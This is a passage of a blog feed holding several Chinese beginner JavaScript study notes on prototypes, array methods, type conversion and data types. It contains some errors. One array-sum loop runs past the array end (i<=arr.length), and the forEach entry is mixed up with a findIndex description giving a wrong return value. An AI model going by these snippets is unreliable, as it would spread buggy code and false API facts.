walking&#x27;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码中，Animal.prototype对象上面定义了一个walk方法，这个方法将可以在所有Animal实例对象上面调用。</p><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……</p><p>如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性。也就是说，所有对象都继承了Object.prototype的属性。这就是所有对象都有valueOf和toString方法的原因，因为这是从Object.prototype继承的。</p><p>那么，Object.prototype对象有没有它的原型呢？回答是Object.prototype的原型是null。null没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是null。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.getPrototypeOf(Object.prototype)</span><br><span class="line">// null</span><br></pre></td></tr></table></figure><p>上面代码表示，Object.prototype对象的原型是null，由于null没有任何属性，所以原型链到此为止。Object.getPrototypeOf方法返回参数对象的原型，具体介绍请看后文。</p><p>读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的Object.prototype还是找不到，则返回undefined。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。</p><p>注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。</p><p>举例来说，如果让构造函数的prototype属性指向一个数组，就意味着实例对象可以调用数组方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var MyArray = function () &#123;&#125;;</span><br><span class="line"></span><br><span class="line">MyArray.prototype = new Array();</span><br><span class="line">MyArray.prototype.constructor = MyArray;</span><br><span class="line"></span><br><span class="line">var mine = new MyArray();</span><br><span class="line">mine.push(1, 2, 3);</span><br><span class="line">mine.length // 3</span><br><span class="line">mine instanceof Array // true</span><br></pre></td></tr></table></figure><p>上面代码中，mine是构造函数MyArray的实例对象，由于MyArray.prototype指向一个数组实例，使得mine可以调用数组方法（这些方法定义在数组实例的prototype对象上面）。最后那行instanceof表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明mine为Array的实例</p><h1 id="Object-prototype-proto"><a href="#Object-prototype-proto" class="headerlink" title="Object.prototype.proto"></a>Object.prototype.<strong>proto</strong></h1><p>实例对象的__proto__属性（前后各两个下划线），返回该对象的原型。该属性可读写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var p = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.__proto__ = p;</span><br><span class="line">Object.getPrototypeOf(obj) === p // true</span><br></pre></td></tr></table></figure><p>上面代码通过__proto__属性，将p对象设为obj对象的原型。</p><p>根据语言标准，__proto__属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。因此，应该尽量少用这个属性，而是用Object.getPrototypeof()和Object.setPrototypeOf()，进行原型对象的读写操作。</p><p>原型链可以用__proto__很直观地表示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var A = &#123;</span><br><span class="line">  name: &#x27;张三&#x27;</span><br><span class="line">&#125;;</span><br><span class="line">var B = &#123;</span><br><span class="line">  name: &#x27;李四&#x27;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var proto = &#123;</span><br><span class="line">  print: function () &#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.__proto__ = proto;</span><br><span class="line">B.__proto__ = proto;</span><br><span class="line"></span><br><span class="line">A.print() // 张三</span><br><span class="line">B.print() // 李四</span><br><span class="line"></span><br><span class="line">A.print === B.print // true</span><br><span class="line">A.print === proto.print // true</span><br><span class="line">B.print === proto.print // true</span><br></pre></td></tr></table></figure><p>上面代码中，A对象和B对象的原型都是proto对象，它们都共享proto对象的print方法。也就是说，A和B的print方法，都是在调用proto对象的print方法。</p><h1 id="获取原型对象方法的比较"><a href="#获取原型对象方法的比较" class="headerlink" title="获取原型对象方法的比较"></a>获取原型对象方法的比较</h1><p>如前所述，__proto__属性指向当前对象的原型对象，即构造函数的prototype属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var obj = new Object();</span><br><span class="line"></span><br><span class="line">obj.__proto__ === Object.prototype</span><br><span class="line">// true</span><br><span class="line">obj.__proto__ === obj.constructor.prototype</span><br><span class="line">// true</span><br></pre></td></tr></table></figure><p>上面代码首先新建了一个对象obj，它的__proto__属性，指向构造函数（Object或obj.constructor）的prototype属性。</p><p>因此，获取实例对象obj的原型对象，有三种方法。</p><ul><li>obj.<strong>proto</strong></li><li>obj.constructor.prototype</li><li>Object.getPrototypeOf(obj)</li></ul><p>上面三种方法之中，前两种都不是很可靠。__proto__属性只有浏览器才需要部署，其他环境可以不部署。而obj.constructor.prototype在手动改变原型对象时，可能会失效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var P = function () &#123;&#125;;</span><br><span class="line">var p = new P();</span><br><span class="line"></span><br><span class="line">var C = function () &#123;&#125;;</span><br><span class="line">C.prototype = p;</span><br><span class="line">var c = new C();</span><br><span class="line"></span><br><span class="line">c.constructor.prototype === p // false</span><br></pre></td></tr></table></figure><p>上面代码中，构造函数C的原型对象被改成了p，但是实例对象的c.constructor.prototype却没有指向p。所以，在改变原型对象时，一般要同时设置constructor属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C.prototype = p;</span><br><span class="line">C.prototype.constructor = C;</span><br><span class="line"></span><br><span class="line">var c = new C();</span><br><span class="line">c.constructor.prototype === p // true</span><br></pre></td></tr></table></figure><p>因此，推荐使用第三种Object.getPrototypeOf方法，获取原型对象。</p><p><strong>参考链接：阮一峰-<a href="https://wangdoc.com/javascript/">JavaScript教程</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS数组API运用相关代码总结</title>
      <link href="/posts/c07d50bb/"/>
      <url>/posts/c07d50bb/</url>
      
        <content type="html"><![CDATA[<h1 id="自己总结代码题"><a href="#自己总结代码题" class="headerlink" title="自己总结代码题"></a>自己总结代码题</h1><p>1.使得 students 按分数的高低从大到小排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var students = [&#x27;小明&#x27;,&#x27;小红&#x27;,&#x27;小花&#x27;] var scores = &#123; 小明: 59, 小红: 99, 小花: 80 &#125; students.sort(???)</span><br></pre></td></tr></table></figure><p>请填写 ??? 使得 students 按分数的高低从大到小排列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function ( x , y ) &#123;</span><br><span class="line">    return scores[y]-scores[x]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5,6,7,8,9]</span><br><span class="line">a.filter(???).map(???) // [4,16,36,64]</span><br></pre></td></tr></table></figure></li></ol><ul><li>获取所有偶数</li><li>得到所有偶数的平方</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a.filter( function ( value , key ) &#123;</span><br><span class="line">    return value % 2 === 0</span><br><span class="line">    &#125;).map ( function ( value ) &#123;</span><br><span class="line">        return value * value</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5,6,7,8,9]</span><br><span class="line">a.reduce(???,???)</span><br></pre></td></tr></table></figure>计算所有奇数的和<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a.reduce(function(sum,b)&#123;</span><br><span class="line">    if( b % 2 !=0)&#123;</span><br><span class="line">        sum = sum + b</span><br><span class="line">    &#125;return sum</span><br><span class="line">    &#125;,0)</span><br></pre></td></tr></table></figure>数组求和，一般我们的想法都是去遍历数组各项，然后累加。<br>那就是这样：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> function sumArr(arr)&#123;</span><br><span class="line">      var sum = 0;</span><br><span class="line">      for(var i = 0;i&lt;=arr.length;i++)&#123;</span><br><span class="line">    sum += arr[i];//前提是arr中各项是数字，而不是数字字符串</span><br><span class="line">//如果是数字字符串：sum += Number(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>又或者是forEach遍历：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sumArr(arr)&#123;</span><br><span class="line">        var sum = 0;</span><br><span class="line">        arr.forEach(function(val,index,arr)&#123;</span><br><span class="line">              sum += val;</span><br><span class="line">        &#125;)</span><br><span class="line">    return sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种比较黑科技的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sumArr(arr)&#123;</span><br><span class="line">        return eval(arr.join(&quot;+&quot;)) </span><br><span class="line">&#125;//直接把他变成各个数的加法运算字符串</span><br></pre></td></tr></table></figure><p>当然还有这种被人广泛称赞的函数式编程的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sumArr(arr)&#123;</span><br><span class="line">        return arr.reduce(function(prev,cur)&#123;</span><br><span class="line">            return prev + cur;</span><br><span class="line">        &#125;,0);</span><br><span class="line">&#125;</span><br><span class="line">//reduce方法有两个参数，一个是callbackfunction(回调函数)，</span><br><span class="line">//二是设置prev的初始类型和初始值</span><br></pre></td></tr></table></figure><h1 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h1><p>concat() 方法用于连接两个或多个数组。</p><p>该方法不会改变现有的数组，而仅仅会返回被连接数组的一个副本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayObject.concat(arrayX,arrayX,......,arrayX)</span><br></pre></td></tr></table></figure><p><strong>返回值</strong></p><p>返回一个新的数组。该数组是通过把所有 arrayX 参数添加到 arrayObject 中生成的。如果要进行 concat() 操作的参数是数组，那么添加的是数组中的元素，而不是数组。</p><h1 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h1><p>forEachfindIndex()方法返回满足回调条件的数组中第一个元素的索引。否则将返回1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr.forEach(function callback(currentValue, index, array) &#123;</span><br><span class="line">    //your iterator</span><br><span class="line">&#125;[, thisArg]);</span><br></pre></td></tr></table></figure><p>callback：回调函数。</p><p>currentValue：在数组中处理当前元素</p><p>index：在数组中处理当前元素的索引。</p><p>array：当前数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">a.forEach(function(element) &#123;</span><br><span class="line">    console.log(element);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// a</span><br><span class="line">// b</span><br><span class="line">// c</span><br></pre></td></tr></table></figure><h1 id="join"><a href="#join" class="headerlink" title="join"></a>join</h1><p>join()将数组中的所有元素(或类似数组的对象)连接到一个字符串中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr.join()</span><br><span class="line">arr.join(separator)</span><br></pre></td></tr></table></figure><p>separator：分隔符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var a = [&#x27;Wind&#x27;, &#x27;Rain&#x27;, &#x27;Fire&#x27;];</span><br><span class="line">a.join();    // &#x27;Wind,Rain,Fire&#x27;</span><br><span class="line">a.join(&#x27;-&#x27;); // &#x27;Wind-Rain-Fire&#x27;</span><br></pre></td></tr></table></figure><h1 id="keys"><a href="#keys" class="headerlink" title="keys"></a>keys</h1><p>keys()方法返回一个新的数组迭代器对象，该对象包含数组中每个索引的键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.keys()</span><br></pre></td></tr></table></figure><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><p>map()方法创建一个新的数组，该数组的结果是调用调用数组中的每个元素的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var new_array = arr.map(function callback(currentValue, index, array) &#123;</span><br><span class="line">    // Return element for new_array</span><br><span class="line">&#125;[, thisArg])</span><br></pre></td></tr></table></figure><h1 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h1><p>reduce()方法对累加器和数组中的每个元素(从左到右)使用一个函数，以将其还原为一个值</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS里的数据类型转换</title>
      <link href="/posts/21ac2ad5/"/>
      <url>/posts/21ac2ad5/</url>
      
        <content type="html"><![CDATA[<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>本文分别讲下数据类型之间的相互转换</p><h2 id="转换为string"><a href="#转换为string" class="headerlink" title="转换为string"></a>转换为string</h2><ol><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据类型.toString</span><br></pre></td></tr></table></figure></li></ol><table><thead><tr><th>数据类型</th><th>string</th></tr></thead><tbody><tr><td>number</td><td>toString</td></tr><tr><td>boolean</td><td>toString</td></tr><tr><td>symbol</td><td>不研究</td></tr><tr><td>null</td><td>报错</td></tr><tr><td>undefined</td><td>报错</td></tr><tr><td>object</td><td>toString</td></tr><tr><td>2.</td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据类型 + &#x27;&#x27;</span><br><span class="line">&#x27;&#x27; + 数据类型</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca5b94a9b8fa.png" alt="clipboard.png"><br>3. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.String(/*数据类型*/)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca5b9c09eeda.png" alt="clipboard.png"></p><h2 id="转换为boolean"><a href="#转换为boolean" class="headerlink" title="转换为boolean"></a>转换为boolean</h2><p>1. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Boolean(/*数据类型*/)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca5b9c09eeda.png" alt="clipboard.png"></p><p>2.<br>因为!表示取反<br>!!表示负负得正</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!/*数据类型*/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca5bb19da865.png" alt="clipboard.png"></p><h3 id="5个falsy值"><a href="#5个falsy值" class="headerlink" title="5个falsy值"></a>5个falsy值</h3><ul><li>数字里只有0 NaN false</li><li>string中只有空字符串’’是false</li><li>null 和undefined 只有一个值，就是false</li><li>obiect 都是true,object包括数组和函数所以他们俩也是true<br><img src="https://i.loli.net/2019/04/04/5ca5bbea358f1.png" alt="clipboard.png"><br><strong><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Falsy">falsy参考链接</a></strong></li></ul><h2 id="转换为number"><a href="#转换为number" class="headerlink" title="转换为number"></a>转换为number</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;--&gt;1</span><br></pre></td></tr></table></figure><p>1. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Number(&#x27;1&#x27;)===1</span><br></pre></td></tr></table></figure><p>2. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseInt(&#x27;1&#x27;,10)===1//10表示十进制</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca5c241a55ee.png" alt="clipboard.png"><br>3.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseFloat(&#x27;1.23&#x27;)===1.23</span><br></pre></td></tr></table></figure><ol start="4"><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;-0===1</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2019/04/04/5ca5c0d2e34ae.png" alt="clipboard.png"></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+&#x27;1&#x27;===1</span><br><span class="line">+&#x27;-1&#x27;===-1</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2019/04/04/5ca5c1e8c6501.png" alt="clipboard.png"></li></ol><h2 id="转为null和undefined都只有一个值"><a href="#转为null和undefined都只有一个值" class="headerlink" title="转为null和undefined都只有一个值"></a>转为null和undefined都只有一个值</h2>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS里的数据类型</title>
      <link href="/posts/41571557/"/>
      <url>/posts/41571557/</url>
      
        <content type="html"><![CDATA[<h1 id="JS里的7种数据类型"><a href="#JS里的7种数据类型" class="headerlink" title="JS里的7种数据类型"></a>JS里的7种数据类型</h1><p><strong>JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 新增的第七种 Symbol 类型的值，不描述。）</strong></p><ul><li>数值（number）：整数和小数（比如1和3.14）</li><li>字符串（string）：文本（比如Hello World）。</li><li>布尔值（boolean）：表示真伪的两个特殊值，即true（真）和false（假）</li><li>undefined：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值</li><li>null：表示空值，即此处的值为空。</li><li>对象（object）：各种值组成的集合。</li><li>Symbol（符号）：<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Symbol">https://developer.mozilla.org/zh-CN/docs/Glossary/Symbol</a></li></ul><p>string 表示可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &#x27;//空字符串</span><br><span class="line">&quot; &quot;//空字符串</span><br></pre></td></tr></table></figure><p>转义符号为\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = &quot;&#x27;&quot;//单引号</span><br><span class="line">var a = &#x27;&quot;&#x27;//双引号</span><br><span class="line">var a = &#x27;\&#x27;&#x27;//单引号</span><br><span class="line">var n = &#x27;\n&#x27;//回车</span><br><span class="line">var t = &#x27;\t&#x27;//Tab(制表符)</span><br><span class="line">var b = &#x27;\\&#x27;//表示\符号</span><br></pre></td></tr></table></figure><p><strong>多行字符串表示</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//不是字符串里有回车</span><br><span class="line">var s = &#x27;12345\</span><br><span class="line">         67890&#x27;//坑人语法不使用</span><br><span class="line">var s2 = &#x27;12345&#x27;       </span><br><span class="line">         &#x27;67890&#x27; //易报错5之后有看不见的空格</span><br></pre></td></tr></table></figure><p><strong>以上两种不建议使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var s3 = &#x27;12345&#x27;+</span><br><span class="line">         &#x27;67890&#x27;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;建议使用这个语法&#x3D;&#x3D;</p><p>在ES6中有个新的语法特性为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var s4 = &#x27;12345  //此处5后面有个回车</span><br><span class="line">67890&#x27;//实际为11个字符包含一个回车</span><br></pre></td></tr></table></figure><p><strong>关于null和undefined</strong></p><ol><li>变量没有值-undefined(语法)</li><li><blockquote><p>有一个对象objest，现在不想赋值-null</p></blockquote></li></ol><blockquote><p>有一个非对象，不想赋值-undefined</p></blockquote><p><strong>对象也是哈希表</strong><br>关于命名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">person[&#x27;name&#x27;]</span><br><span class="line">person[name]</span><br><span class="line">person.name</span><br><span class="line">//下面两种符合标识符命名规则的情况下3种相等</span><br></pre></td></tr></table></figure><h1 id="typeof-运算符"><a href="#typeof-运算符" class="headerlink" title="typeof 运算符"></a>typeof 运算符</h1><p>JavaScript 有三种方法，可以确定一个值到底是什么类型。</p><p>typeof运算符<br>instanceof运算符<br>Object.prototype.toString方法<br>instanceof运算符和Object.prototype.toString方法。这里介绍typeof运算符。</p><p>typeof运算符可以返回一个值的数据类型。</p><p>数值、字符串、布尔值分别返回number、string、boolean。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typeof 123 // &quot;number&quot;</span><br><span class="line">typeof &#x27;123&#x27; // &quot;string&quot;</span><br><span class="line">typeof false // &quot;boolean&quot;</span><br></pre></td></tr></table></figure><p>函数返回function。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function f() &#123;&#125;</span><br><span class="line">typeof f</span><br><span class="line">// &quot;function&quot;</span><br></pre></td></tr></table></figure><p>undefined返回undefined。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined</span><br><span class="line">// &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>利用这一点，typeof可以用来检查一个没有声明的变量，而不报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v</span><br><span class="line">// ReferenceError: v is not defined</span><br><span class="line"></span><br><span class="line">typeof v</span><br><span class="line">// &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，变量v没有用var命令声明，直接使用就会报错。但是，放在typeof后面，就不报错了，而是返回undefined。</p><p>实际编程中，这个特点通常用在判断语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 错误的写法</span><br><span class="line">if (v) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br><span class="line">// ReferenceError: v is not defined</span><br><span class="line"></span><br><span class="line">// 正确的写法</span><br><span class="line">if (typeof v === &quot;undefined&quot;) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对象返回object。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typeof window // &quot;object&quot;</span><br><span class="line">typeof &#123;&#125; // &quot;object&quot;</span><br><span class="line">typeof [] // &quot;object&quot;</span><br></pre></td></tr></table></figure><p>上面代码中，空数组（[]）的类型也是object，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下，instanceof运算符可以区分数组和对象。instanceof运算符的详细解释，请见《面向对象编程》一章。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;&#125;;</span><br><span class="line">var a = [];</span><br><span class="line"></span><br><span class="line">o instanceof Array // false</span><br><span class="line">a instanceof Array // true</span><br><span class="line">null返回object。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof null // &quot;object&quot;</span><br></pre></td></tr></table></figure><p>null的类型是object，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑null，只把它当作object的一种特殊值。后来null独立出来，作为一种单独的数据类型，为了兼容以前的代码，typeof null返回object就没法改变了。</p><p><strong>参考链接</strong></p><ul><li>阮一峰，<a href="https://wangdoc.com/javascript/types/general.html">JavaScript教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS布局</title>
      <link href="/posts/ee1ff2c0/"/>
      <url>/posts/ee1ff2c0/</url>
      
